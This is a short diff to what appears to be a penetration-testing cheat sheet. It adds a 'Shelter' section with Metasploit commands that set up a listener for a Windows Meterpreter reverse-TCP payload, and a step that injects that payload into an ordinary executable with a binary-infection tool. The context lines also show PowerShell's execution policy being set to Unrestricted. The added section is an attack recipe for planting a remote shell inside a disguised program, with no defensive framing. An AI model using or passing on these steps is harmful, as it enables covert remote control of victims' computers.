@@ -60,3 +60,15 @@ Powershell Execution Policy Config:
 Get-ExecutionPolicy -Scope CurrentUser
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
+### Shelter
+```
+1. msfconsole:
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST ip
+set LPORT port
+set AutoRunScript post/windows/manage/migrate
+exploit
+2. Use shelter to inject msfpayload into exe
+```
